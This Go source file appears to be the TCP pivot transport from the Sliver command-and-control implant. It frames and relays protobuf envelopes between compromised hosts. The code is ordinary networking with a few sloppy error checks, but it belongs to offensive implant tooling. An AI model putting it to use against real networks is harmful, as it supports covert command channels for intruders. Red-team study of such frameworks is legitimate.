package transports

import (
	"net"
	"bytes"
	"encoding/binary"

	// {{if .Debug}}
	"log"
	// {{end}}

	"github.com/golang/protobuf/proto"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

const (
	readBufSizeTCP  = 1024
	writeBufSizeTCP = 1024
)

func tcpPivoteWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Debug}}
		log.Print("[tcppivot] Marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	_, err = (*conn).Write(dataLengthBuf.Bytes())
	if err != nil {
		// {{if .Debug}}
		log.Printf("[tcppivot] Error %v and %d\n", err, dataLengthBuf)
		// {{end}}
	}
	totalWritten := 0
	for totalWritten < len(data)-writeBufSizeTCP {
		n, err2 := (*conn).Write(data[totalWritten : totalWritten+writeBufSizeTCP])
		totalWritten += n
		if err2 != nil {
			// {{if .Debug}}
			log.Printf("[tcppivot] Error %v\n", err)
			// {{end}}
		}
	}
	if totalWritten < len(data) {
		missing := len(data) - totalWritten
		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
		if err != nil {
			// {{if .Debug}}
			log.Printf("[tcppivot] Error %v\n", err)
			// {{end}}
		}
	}
	return nil
}

func tcpPivotReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
	dataLengthBuf := make([]byte, 4)
	_, err := (*conn).Read(dataLengthBuf)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[tcppivot] Error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, readBufSizeTCP)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := (*conn).Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Debug}}
			log.Printf("read error: %s\n", err)
			// {{end}}
			break
		}
	}
	envelope := &sliverpb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Debug}}
		log.Printf("[tcppivot] Unmarshaling envelope error: %v", err)
		// {{end}}
		return &sliverpb.Envelope{}, err
	}
	return envelope, nil
}
